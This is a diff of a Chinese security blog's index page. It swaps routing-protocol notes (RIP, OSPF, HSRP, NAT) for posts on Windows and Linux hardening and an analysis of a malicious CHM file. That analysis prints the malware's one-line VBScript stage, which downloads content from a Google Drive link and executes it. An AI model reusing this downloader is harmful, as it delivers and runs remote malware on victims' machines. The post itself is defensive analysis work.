+<td>25</td>
+<td>SMTP（简单邮件传输协议）</td>
+</tr>
+</tbody></table>
+<h4 id="3、windows账号及安全策略"><a href="#3、windows账号及安全策略" class="headerlink" title="3、windows账号及安全策略"></a>3、windows账号及安全策略</h4><p>  windows+R  secpol.msc </p>
 <ul>
-<li><p>将一台内网的服务器发布到内网，从而使内网的主机可以访问到内网的服务器</p>
-</li>
-<li><p>192.168.1.1：80 -》54.234.123.55：80</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ip nat inside source <span class="keyword">static</span> tcp <span class="number">192</span>,<span class="number">168.1</span>.<span class="number">100</span> <span class="number">80</span> <span class="number">23.34</span>.<span class="number">56.78</span> <span class="number">8888</span></span><br></pre></td></tr></table></figure></li>
+<li>账号策略</li>
 </ul>
-</li>
-</ul>
-<p>​				</p>
-
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">密码必须符合复杂性要求：启用 </span><br><span class="line">密码长度最小值         8个字符 </span><br><span class="line">密码最长使用期限：       30天 </span><br><span class="line">强制密码历史：         3个记住的密码</span><br></pre></td></tr></table></figure>
           <!--noindex-->
             <div class="post-button">
-              <a class="btn" href="/2023/03/15/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/NAT_new/#more" rel="contents">
+              <a class="btn" href="/2023/06/11/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/windows%20%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%8A%A0%E5%9B%BA%E6%8A%80%E6%9C%AF_new/#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
@@ -1023,7 +1021,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2023/03/11/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/%E5%8A%A8%E6%80%81%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AE_new/">
+    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2023/06/04/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -1037,7 +1035,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2023/03/11/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/%E5%8A%A8%E6%80%81%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AE_new/" class="post-title-link" itemprop="url">动态路由协议</a>
+            <a href="/2023/06/04/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/" class="post-title-link" itemprop="url">Linux系统安全配置</a>
         </h2>
 
         <div class="post-meta">
@@ -1047,7 +1045,7 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2023-03-11 00:00:00" itemprop="dateCreated datePublished" datetime="2023-03-11T00:00:00+08:00">2023-03-11</time>
+              <time title="创建时间：2023-06-04 00:00:00" itemprop="dateCreated datePublished" datetime="2023-06-04T00:00:00+08:00">2023-06-04</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -1070,213 +1068,21 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h2 id="动态路由协议"><a href="#动态路由协议" class="headerlink" title="动态路由协议"></a>动态路由协议</h2><ul>
-<li><p>动态路由协议</p>
-<ul>
-<li><p>RIP：路由信息协议，距离矢量路由协议</p>
-</li>
-<li><p>OSPF：开放式最短路径优先</p>
-</li>
-<li><p>BGP：外部网关路由协议</p>
-</li>
-</ul>
-</li>
-<li><p>特点</p>
-<ul>
-<li><p>减少管理员的工作量</p>
-</li>
-<li><p>增加了网络带宽</p>
-</li>
-</ul>
-</li>
-<li><p>什么是内部，什么是外部</p>
-<ul>
-<li>AS：运行相同的路由协议的路由器属于同一个自治系统</li>
-<li>通过自治系统连接外部的路由器，需要经过外部网关</li>
-<li>内部网关路由协议（IGP）：用于在单一自治系统中去决策路由，RIP，OSPF</li>
-<li>外部网关路由协议：用于连接不同自治系统，BGP</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230311225105486.png" alt="image-20230311225105486"></p>
-<ul>
-<li><p>动态路由协议需要考虑的内容</p>
-<ul>
-<li>度量值：跳数、带宽、时延、成本</li>
-<li>收敛：所有路由器的路由表达到一致的状态</li>
-</ul>
-</li>
-<li><p>RIP协议</p>
-<ul>
-<li><p>基本概念</p>
-<ul>
-<li><p>一种内部网关协议，在单一自治系统内的路由器去传递路由信息</p>
-</li>
-<li><p>靠跳数来衡量到达目标的距离</p>
-<ul>
-<li>最大15跳，16代表不可达</li>
-</ul>
-</li>
-<li><p>每隔30秒向相邻的路由器发送路由更新消息，采用UDP 520端口</p>
-</li>
-<li><p>从相邻的路由器去学习路由条目</p>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-<p><img src="https://cdn.jsdelivr.net/gh/scuzhangzhang/pic/img/image-20230311230625611.png" alt="image-20230311230625611"></p>
-<p>不同颜色代表不同周期，C代表直连，R代表路由器，第二列代表网段，第三列代表端口号，第四列代表距离</p>
-<ul>
-<li><p>OSPF 动态路由协议</p>
-<ul>
-<li><p>概念</p>
-<ul>
-<li><p>开放式最短路径优先路由协议，内部网关路由协议</p>
-</li>
-<li><p>链路状态路由协议：在单一区域内的路由器可以向相邻路由器发送链路状态信息</p>
-</li>
-<li><p>工作过程</p>
-<ul>
-<li><p>相邻的路由器建立邻接关系</p>
-</li>
-<li><p>根据链路信息，建立链路状态数据库</p>
-</li>
-<li><p>最短路径树计算</p>
-</li>
-<li><p>路由表</p>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>OSPF区域</p>
-<ul>
-<li><p>划分区域</p>
-<ul>
-<li>适应大型网络</li>
-<li>每个ospf 路由器只维护自己所在区域的链路状态信息</li>
-<li>每个区域有一个区域ID，用十进制或者IP地址表示</li>
-<li>骨干区域：区域之间的路由信息传播<ul>
-<li>区域ID：0，0.0.0.0</li>
-</ul>
-</li>
-<li>非骨干区域：普通区域</li>
-</ul>
-</li>
-<li><p>单区域内容</p>
-<ul>
-<li><p>在同一个区域当中通过选举DR和BDR来节省网络中的流量</p>
-<p>区域中的其他路由器只会和DR和BDR建立邻接关系  </p>
-</li>
-<li><p>DR 选举</p>
-<ul>
-<li>通过routeID进行选举，最大的作为DR，第二大作为 BDR</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>度量值</p>
-<ul>
-<li>cost值（代价）</li>
-</ul>
-</li>
-<li><p>邻接关系建立</p>
-<ul>
-<li><p>以组播方式发送</p>
-<ul>
-<li>224.0.0.5 代表所有OSPF</li>
-<li>224.0.0.6 代表DR BDR</li>
-</ul>
-</li>
-<li><p>报文类型</p>
-<ul>
-<li>hello保温</li>
-<li>数据库描述包</li>
-<li>链路状态请求包</li>
-<li>链路状态更新包</li>
-<li>链路状态确认包</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>RIP 和OSPF对比</p>
-<ul>
-<li><p>RIP１　不支持可变长子网掩码，使用广播更新</p>
-</li>
-<li><p>RIP 2 使用组播更新</p>
-</li>
-<li><p>跳数限制15跳</p>
-</li>
-<li><p>不能划分区域，网络收敛慢</p>
-</li>
-<li><p>OSPF 使用组播更新</p>
-</li>
-<li><p>网络收敛快，通过区域划分</p>
-</li>
-<li><p>支持可变长子网掩码，携带子网掩码</p>
-</li>
-</ul>
-</li>
-<li><p>ospf 配置</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">route ospf 10</span><br><span class="line">netword 192.168.10.0 0.0.0.255 area 0</span><br><span class="line">192.168.10.0 宣告的网段 0.0.0.255 反码  area 表示宣告的区域</span><br><span class="line">show ip ospf  查看ospf 基本配置信息</span><br><span class="line">show ip ospf neighbor  查看邻接关系</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>ospf 多区域概念</p>
-<ul>
-<li><p>目的  实现大型网络环境，实现单区域网络快速收敛，改善网络，减小路由表</p>
-</li>
-<li><p>通信</p>
-<ul>
-<li>域内通信量</li>
-<li>域外通信量- ABR</li>
-<li>外部通信量-与其他自治系统  ASBR</li>
-</ul>
-</li>
-<li><p>区域</p>
-<ul>
-<li>骨干区域</li>
-<li>非骨干区域<ul>
-<li>标准区域</li>
-<li>末梢区域</li>
-<li>完全末梢</li>
-<li>非纯末梢</li>
-</ul>
-</li>
-</ul>
-</li>
-<li><p>OSPF 高级配置</p>
-<ul>
-<li><p>路由重分发</p>
-<p>在大型网络中，可能在同一网络中用到多种路由协议，为了协同工作，路由器通过路由重分发将其学习到的一种路由协议的路由通过另一种路由协议广播出去。</p>
-</li>
-<li><p>NSSA</p>
-<p>非纯末梢区域，在此区域内会有一个ASBR路由器，需要在ASBR上配置重分发</p>
-<ul>
-<li>多了一种类型LSA，类型7LSA在一个  NSSA区域内携带外部信息</li>
-<li>在NSSA的ABR上转换位5LSA </li>
-<li>N1 N2类型</li>
-<li>通过NSSA的ABR之后转换为E1、E2</li>
-</ul>
-</li>
-<li><p>虚链路</p>
-<ul>
-<li>在两台ABR之间建立，穿越一个非骨干区域</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
-</li>
-</ul>
+          <h3 id="Linux系统安全配置"><a href="#Linux系统安全配置" class="headerlink" title="Linux系统安全配置"></a>Linux系统安全配置</h3><h4 id="系统权限"><a href="#系统权限" class="headerlink" title="系统权限"></a>系统权限</h4><h5 id="1、安装操作系统"><a href="#1、安装操作系统" class="headerlink" title="1、安装操作系统"></a>1、安装操作系统</h5><p>1、选择稳定版操作系统</p>
+<p>2、最小化安装（后期方便安装应用）</p>
+<p>3、不要安装gcc ，make（防止黑客进入以后方便操作）</p>
+<p>4、安装系统后更新系统 </p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum -y update</span><br></pre></td></tr></table></figure>
 
+<h5 id="2、文件权限"><a href="#2、文件权限" class="headerlink" title="2、文件权限"></a>2、文件权限</h5><ul>
+<li><p>文件夹默认权限  755   777-022 </p>
+</li>
+<li><p>文件默认权限 644       666-022</p>
+</li>
+</ul>
           <!--noindex-->
             <div class="post-button">
-              <a class="btn" href="/2023/03/11/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/%E5%8A%A8%E6%80%81%E8%B7%AF%E7%94%B1%E5%8D%8F%E8%AE%AE_new/#more" rel="contents">
+              <a class="btn" href="/2023/06/04/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/Linux%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
@@ -1300,7 +1106,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2023/03/10/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/%E7%83%AD%E5%A4%87%E4%BB%BD%E8%B7%AF%E7%94%B1%E9%80%89%E6%8B%A9%E5%8D%8F%E8%AE%AE_new/">
+    <link itemprop="mainEntityOfPage" href="http://zwjsfdbb.top/2023/05/06/%E9%80%86%E5%90%91/chm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -1314,7 +1120,7 @@
       <header class="post-header">
         <h2 class="post-title" itemprop="name headline">
           
-            <a href="/2023/03/10/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/%E7%83%AD%E5%A4%87%E4%BB%BD%E8%B7%AF%E7%94%B1%E9%80%89%E6%8B%A9%E5%8D%8F%E8%AE%AE_new/" class="post-title-link" itemprop="url">热备份路由选择协议</a>
+            <a href="/2023/05/06/%E9%80%86%E5%90%91/chm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/" class="post-title-link" itemprop="url">一个chm恶意文件分析</a>
         </h2>
 
         <div class="post-meta">
@@ -1324,7 +1130,7 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2023-03-10 00:00:00" itemprop="dateCreated datePublished" datetime="2023-03-10T00:00:00+08:00">2023-03-10</time>
+              <time title="创建时间：2023-05-06 00:00:00" itemprop="dateCreated datePublished" datetime="2023-05-06T00:00:00+08:00">2023-05-06</time>
             </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -1332,7 +1138,7 @@
               </span>
               <span class="post-meta-item-text">分类于</span>
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/" itemprop="url" rel="index"><span itemprop="name">系统基础</span></a>
+                  <a href="/categories/%E9%80%86%E5%90%91/" itemprop="url" rel="index"><span itemprop="name">逆向</span></a>
                 </span>
             </span>
 
@@ -1347,24 +1153,20 @@
     <div class="post-body" itemprop="articleBody">
 
       
-          <h2 id="HSRP（热备份路由选择协议）"><a href="#HSRP（热备份路由选择协议）" class="headerlink" title="HSRP（热备份路由选择协议）"></a>HSRP（热备份路由选择协议）</h2><h3 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h3><p>1、了解HSRP的相关概念</p>
-<p>2、理解工作原理</p>
-<p>3、配置</p>
-<h4 id="一、概念"><a href="#一、概念" class="headerlink" title="一、概念"></a>一、概念</h4><p>1、成员</p>
-<ul>
-<li>活跃路由器</li>
-<li>备份路由器</li>
-<li>虚拟路由器</li>
-<li>其他路由器</li>
-</ul>
-<p>2、虚拟MAC地址</p>
-<ul>
-<li>４８位包括前２４　厂商编码，后２４位序列号</li>
-<li>后24位包括固定值07AC+HSRP组号</li>
-</ul>
+          <p>1、7zip解压后找到html文件中的恶意代码如下</p>
+<p><img src="https://raw.githubusercontent.com/scuzhangzhang/CP_img/master/img/202306091743111.png" alt="image-20230609172323245"></p>
+<p><img src="https://raw.githubusercontent.com/scuzhangzhang/CP_img/master/img/202306091743224.png" alt="image-20230609174018273"></p>
+<p>在html 中有两个OBJECR标签，标签的作用是创建一个 ActiveX 控件，在页面上创建快捷方式，随后调用click函数从而执行快捷方式对应的内容。</p>
+<p>。OBJECT 标签中有几个 PARAM 标签，它们定义了控件所需的参数。这些参数包括 Command（表示执行类型）、Button（表示按钮样式）、Item1 和 Item2（表示快捷方式的属性）。</p>
+<p>可以很清晰的看出</p>
+<p>cfx 的作用是创建C:\ProgramData\Iconcache.dat”并解码成C:\ProgramData\Iconcache.vbs，vbs的内容为</p>
+<figure class="highlight vbs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">On</span> <span class="keyword">Error</span> <span class="keyword">Resume</span> <span class="keyword">Next</span>:<span class="keyword">Set</span> ineszcdwlpoj = <span class="built_in">CreateObject</span>(<span class="string">&quot;MSXML2.ServerXMLHTTP&quot;</span>):ineszcdwlpoj.open <span class="string">&quot;GET&quot;</span>, <span class="string">&quot;https://drive.google.com/uc?export=download&amp;id=1Ovbe1se3Rh9WH1LYT1ob1ngpdtjJW1yF&amp;confirm=t&quot;</span>, <span class="literal">False</span>:ineszcdwlpoj.Send:<span class="keyword">Execute</span>(ineszcdwlpoj.responseText)<span class="comment">&#x27;tffxddrsdssawdxvcbgnhjjuyjbv</span></span><br></pre></td></tr></table></figure>
+
+<p>wsy的功能为执行vbs ，下载文件并执行。</p>
+
           <!--noindex-->
             <div class="post-button">
-              <a class="btn" href="/2023/03/10/%E7%B3%BB%E7%BB%9F%E5%9F%BA%E7%A1%80/%E7%83%AD%E5%A4%87%E4%BB%BD%E8%B7%AF%E7%94%B1%E9%80%89%E6%8B%A9%E5%8D%8F%E8%AE%AE_new/#more" rel="contents">
+              <a class="btn" href="/2023/05/06/%E9%80%86%E5%90%91/chm%E6%9C%A8%E9%A9%AC%E5%88%86%E6%9E%90/#more" rel="contents">
                 阅读全文 &raquo;
               </a>
             </div>
@@ -1387,7 +1189,7 @@
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/3/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/10/">10</a><a class="extend next" rel="next" href="/page/5/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
+    <a class="extend prev" rel="prev" href="/page/3/"><i class="fa fa-angle-left" aria-label="上一页"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/13/">13</a><a class="extend next" rel="next" href="/page/5/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
   </nav>
 
 
@@ -1453,20 +1255,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">94</span>
+          <span class="site-state-item-count">128</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-count">8</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">7</span>
+        <span class="site-state-item-count">8</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
